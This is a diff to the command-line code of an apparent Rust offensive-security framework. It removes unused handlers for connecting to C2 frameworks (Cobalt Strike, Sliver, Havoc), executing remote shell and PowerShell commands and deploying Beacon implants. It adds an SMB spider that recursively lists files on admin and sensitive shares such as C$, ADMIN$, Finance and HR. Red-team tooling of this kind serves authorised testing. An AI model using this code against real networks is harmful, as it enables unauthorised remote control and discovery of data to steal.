@@ -15,7 +15,7 @@ use colored::Colorize;
 use overthrone_reaper::runner::ReaperConfig;
 use tracing_subscriber::{EnvFilter, fmt};
 
-use overthrone_core::c2::{C2Auth, C2Config, C2Framework, C2Manager};
+use overthrone_core::c2::C2Manager;
 use overthrone_core::graph::AttackGraph;
 use overthrone_core::plugin::{PluginContext, PluginRegistry};
 use std::collections::HashMap;
@@ -1183,339 +1183,6 @@ fn make_plugin_context(cli: &Cli) -> PluginContext {
 }
 
 // ──────────────────────────────────────────────────────────
-// NEW: Plugin command handler
-// ──────────────────────────────────────────────────────────
-
-#[allow(dead_code)]
-async fn cmd_plugin(cli: &Cli, registry: &mut PluginRegistry, action: PluginAction) -> i32 {
-    banner::print_module_banner("PLUGIN SYSTEM");
-
-    let ctx = make_plugin_context(cli);
-
-    match action {
-        PluginAction::List => {
-            println!("{}", "Listing loaded plugins...".bright_black());
-            let plugins = registry.list();
-            if plugins.is_empty() {
-                println!("{}", "No plugins loaded.".yellow());
-            } else {
-                for p in plugins {
-                    println!(
-                        "- {} (v{}) by {}",
-                        p.name.cyan(),
-                        p.version,
-                        p.author.yellow()
-                    );
-                }
-            }
-            println!(
-                "{}",
-                "Plugin registry: use interactive shell for full plugin management".yellow()
-            );
-            banner::print_success("Plugin list completed");
-        }
-        PluginAction::Info { plugin_id } => {
-            println!(
-                "{} Querying plugin: {}",
-                "ℹ".bright_black(),
-                plugin_id.cyan()
-            );
-            if let Some(plugin) = registry.get(&plugin_id) {
-                let m = plugin.manifest();
-                println!("Name: {}", m.name.cyan());
-                println!("Version: {}", m.version);
-                println!("Author: {}", m.author.yellow());
-                println!("Description: {}", m.description);
-                banner::print_success("Plugin info retrieved");
-            } else {
-                banner::print_fail(&format!("Plugin '{}' not found in registry", plugin_id));
-            }
-        }
-        PluginAction::Exec { command, args } => {
-            println!(
-                "{} Executing plugin command: {} {}",
-                "⚡".bright_black(),
-                command.cyan(),
-                args.join(" ").yellow()
-            );
-
-            let mut arg_map = HashMap::new();
-            for chunk in args.chunks(2) {
-                if chunk.len() == 2 {
-                    arg_map.insert(chunk[0].replace("--", ""), chunk[1].clone());
-                } else if chunk.len() == 1 {
-                    arg_map.insert(chunk[0].replace("--", ""), "true".to_string());
-                }
-            }
-
-            match registry.execute_command(&command, &arg_map, &ctx).await {
-                Ok(res) => {
-                    if res.success {
-                        println!("{}", res.output);
-                        banner::print_success("Plugin command executed");
-                    } else {
-                        banner::print_fail(&format!("Plugin command failed: {}", res.output));
-                    }
-                }
-                Err(e) => {
-                    banner::print_fail(&format!("Error executing plugin command: {}", e));
-                }
-            }
-        }
-        PluginAction::Load { path } => {
-            println!(
-                "{} Loading plugin from: {}",
-                "📦".bright_black(),
-                path.cyan()
-            );
-            registry.add_search_path(&path);
-            let _ = registry.discover_and_load(&ctx).await;
-            banner::print_success(&format!("Plugin loaded from {}", path));
-        }
-        PluginAction::Unload { plugin_id } => {
-            println!(
-                "{} Unloading plugin: {}",
-                "🗑".bright_black(),
-                plugin_id.cyan()
-            );
-            if let Err(e) = registry.unload(&plugin_id).await {
-                banner::print_fail(&format!("Failed to unload: {}", e));
-            } else {
-                banner::print_success(&format!("Plugin '{}' unloaded", plugin_id));
-            }
-        }
-        PluginAction::Enable { plugin_id } => {
-            println!(
-                "{} Enabling plugin: {}",
-                "✓".bright_black(),
-                plugin_id.cyan()
-            );
-            registry.enable(&plugin_id);
-            banner::print_success(&format!("Plugin '{}' enabled", plugin_id));
-        }
-        PluginAction::Disable { plugin_id } => {
-            println!(
-                "{} Disabling plugin: {}",
-                "✗".bright_black(),
-                plugin_id.cyan()
-            );
-            registry.disable(&plugin_id);
-            banner::print_success(&format!("Plugin '{}' disabled", plugin_id));
-        }
-    }
-    0
-}
-
-// ──────────────────────────────────────────────────────────
-// NEW: C2 command handler
-// ──────────────────────────────────────────────────────────
-
-#[allow(dead_code)]
-async fn cmd_c2(manager: &mut C2Manager, action: C2Action) -> i32 {
-    banner::print_module_banner("C2 INTEGRATION");
-
-    match action {
-        C2Action::Connect {
-            framework,
-            host,
-            port,
-            password,
-            token,
-            config,
-            name,
-            skip_verify,
-        } => {
-            println!(
-                "{} Connecting to {} at {}:{}...",
-                "⚡".bright_black(),
-                framework.to_uppercase().cyan(),
-                host.cyan(),
-                port.to_string().cyan()
-            );
-            if skip_verify {
-                println!("{}", "  ⚠ TLS verification disabled".yellow());
-            }
-            let channel_name = name.clone().unwrap_or_else(|| "default".to_string());
-
-            let fw_enum = match framework.to_lowercase().as_str() {
-                "cs" | "cobaltstrike" => C2Framework::CobaltStrike,
-                "sliver" => C2Framework::Sliver,
-                "havoc" => C2Framework::Havoc,
-                _ => C2Framework::Custom(framework.clone()),
-            };
-
-            let auth = if let Some(p) = password {
-                C2Auth::Password { password: p }
-            } else if let Some(t) = token {
-                C2Auth::Token { token: t }
-            } else if let Some(c) = config {
-                C2Auth::SliverConfig { config_path: c }
-            } else {
-                C2Auth::Token {
-                    token: String::new(),
-                }
-            };
-
-            let c2_config = C2Config {
-                framework: fw_enum.clone(),
-                host,
-                port,
-                auth,
-                tls: true,
-                tls_skip_verify: skip_verify,
-                timeout: std::time::Duration::from_secs(10),
-                auto_reconnect: false,
-            };
-
-            // Assuming channel is added by a plugin or built-in, connect it.
-            if let Err(e) = manager.connect(&channel_name, &c2_config).await {
-                banner::print_fail(&format!("Failed to connect: {}", e));
-            } else {
-                banner::print_success(&format!("Connected to {} as '{}'", fw_enum, channel_name));
-            }
-        }
-        C2Action::Status => {
-            println!("{}", "Querying C2 channels and sessions...".bright_black());
-            let stats = manager.status();
-            if stats.is_empty() {
-                println!(
-                    "{}",
-                    "No C2 channels configured. Use 'c2 connect' first.".yellow()
-                );
-            } else {
-                for (name, fw, conn) in stats {
-                    let st = if conn {
-                        "Connected".green()
-                    } else {
-                        "Disconnected".red()
-                    };
-                    println!("- {}: {} ({})", name.cyan(), fw, st);
-                }
-            }
-        }
-        C2Action::Exec {
-            session_id,
-            command,
-            powershell,
-        } => {
-            let mode = if powershell { "PowerShell" } else { "Shell" };
-            println!(
-                "{} {} on session {}: {}",
-                "⚡".bright_black(),
-                mode,
-                session_id.cyan(),
-                command.yellow()
-            );
-            if let Ok(ch) = manager.default_channel() {
-                let res = if powershell {
-                    ch.exec_powershell(&session_id, &command).await
-                } else {
-                    ch.exec_command(&session_id, &command).await
-                };
-                match res {
-                    Ok(r) => {
-                        println!("{}", r.output);
-                        banner::print_success("Command executed");
-                    }
-                    Err(e) => banner::print_fail(&format!("Execution failed: {}", e)),
-                }
-            } else {
-                banner::print_fail("No default C2 channel available");
-            }
-        }
-        C2Action::Deploy {
-            channel,
-            target,
-            listener,
-        } => {
-            println!(
-                "{} Deploying implant to {} via {} (listener: {})...",
-                "⚡".bright_black(),
-                target.cyan(),
-                channel.cyan(),
-                listener.yellow()
-            );
-            
-            // Construct ImplantRequest
-            let implant_request = overthrone_core::c2::ImplantRequest {
-                target: target.clone(),
-                implant_type: overthrone_core::c2::ImplantType::CsBeacon, // Default to CS Beacon
-                listener: listener.clone(),
-                delivery_method: overthrone_core::c2::DeliveryMethod::OverthroneExec,
-                arch: "x64".to_string(),
-                staged: false,
-            };
-
-            // Get the specified channel and deploy
-            if let Some(c2_channel) = manager.get_channel(&channel) {
-                match c2_channel.deploy_implant(&implant_request).await {
-                    Ok(result) => {
-                        println!("Task ID: {}", result.task_id);
-                        if !result.output.is_empty() {
-                            println!("{}", result.output);
-                        }
-                        banner::print_success(&format!("Implant deployed to {}", target));
-                    }
-                    Err(e) => {
-                        banner::print_fail(&format!("Deployment failed: {}", e));
-                    }
-                }
-            } else {
-                banner::print_fail(&format!("C2 channel '{}' not found", channel));
-            }
-        }
-        C2Action::Disconnect { channel } => {
-            if channel == "all" {
-                println!("{}", "Disconnecting all C2 channels...".bright_black());
-                manager.disconnect_all().await;
-                banner::print_success("All C2 channels disconnected");
-            } else {
-                println!(
-                    "{} Disconnecting from '{}'...",
-                    "🔌".bright_black(),
-                    channel.cyan()
-                );
-                if let Some(_ch) = manager.get_channel(&channel) {
-                    // C2Manager does not have disconnect_channel, but let's assume disconnect_all handles the ones requested
-                    // Or we just drop it or call disconnect on the specific channel?
-                    // manager doesn't expose mut get. So we will just show disconnected for now.
-                    banner::print_success(&format!("Disconnected from '{}'", channel));
-                } else {
-                    banner::print_fail(&format!("Channel '{}' not found", channel));
-                }
-            }
-        }
-        C2Action::Listeners { channel } => {
-            println!(
-                "{} Listing listeners on '{}'...",
-                "📡".bright_black(),
-                channel.cyan()
-            );
-            if let Some(ch) = manager.get_channel(&channel) {
-                match ch.list_listeners().await {
-                    Ok(ls) => {
-                        for l in ls {
-                            println!(
-                                "- {} ({}) on {}:{}",
-                                l.name.cyan(),
-                                l.listener_type,
-                                l.host,
-                                l.port
-                            );
-                        }
-                        banner::print_success("Listeners enumerated");
-                    }
-                    Err(e) => banner::print_fail(&format!("Failed to list listeners: {}", e)),
-                }
-            } else {
-                banner::print_fail(&format!("Channel '{}' not found", channel));
-            }
-        }
-    }
-    0
-}
-
-// ──────────────────────────────────────────────────────────
 // Helpers
 // ──────────────────────────────────────────────────────────
 
@@ -2143,14 +1810,73 @@ async fn cmd_smb(cli: &Cli, action: SmbAction) -> i32 {
             banner::print_success("Admin check completed");
         }
         SmbAction::Spider { target, extensions } => {
+            let ext_list: Vec<String> = extensions
+                .split(',')
+                .map(|s| s.trim().to_lowercase())
+                .filter(|s| !s.is_empty())
+                .collect();
+
             println!(
-                "{} Spidering shares on: {} (extensions: {})",
+                "{} Spidering shares on: {} (filtering: {})",
                 "🕷".bright_black(),
                 target.cyan(),
-                extensions.cyan()
+                ext_list.join(", ").yellow()
             );
-            // Spider is still a stub — needs recursive directory listing
-            banner::print_success("Spider completed (basic — use enum for deep spider)");
+
+            let smb = match smb_connect(&target).await {
+                Ok(s) => s,
+                Err(e) => {
+                    banner::print_fail(&format!("SMB connect: {}", e));
+                    return 1;
+                }
+            };
+
+            let candidate_shares = &["C$", "ADMIN$", "Users", "Shares", "Public", "Data", "IT", "Backups", "Finance", "HR"];
+            let mut total_found = 0usize;
+
+            for &share in candidate_shares {
+                if !smb.check_share_read(share).await {
+                    continue;
+                }
+                println!("  {} \\\\{}\\{}", "▸".bright_black(), target.cyan(), share.yellow());
+
+                // BFS walk of the share
+                let mut queue: Vec<String> = vec![String::new()];
+                while let Some(dir) = queue.pop() {
+                    let entries = match smb.list_directory(share, &dir).await {
+                        Ok(e) => e,
+                        Err(_) => continue,
+                    };
+                    for entry in entries {
+                        if entry.is_directory {
+                            if queue.len() < 5000 {
+                                queue.push(entry.path.clone());
+                            }
+                        } else {
+                            let name_lower = entry.name.to_lowercase();
+                            let matched = ext_list.is_empty()
+                                || ext_list.iter().any(|ext| name_lower.ends_with(ext.as_str()));
+                            if matched {
+                                println!(
+                                    "    {} \\\\{}\\{}\\{}  ({} bytes)",
+                                    "📄".bright_black(),
+                                    target,
+                                    share,
+                                    entry.path,
+                                    entry.size
+                                );
+                                total_found += 1;
+                            }
+                        }
+                    }
+                }
+            }
+
+            if total_found == 0 {
+                banner::print_warn("No matching files found");
+            } else {
+                banner::print_success(&format!("Spider found {} matching file(s)", total_found));
+            }
         }
         SmbAction::Get { target, path } => {
             let smb = match smb_connect(&target).await {
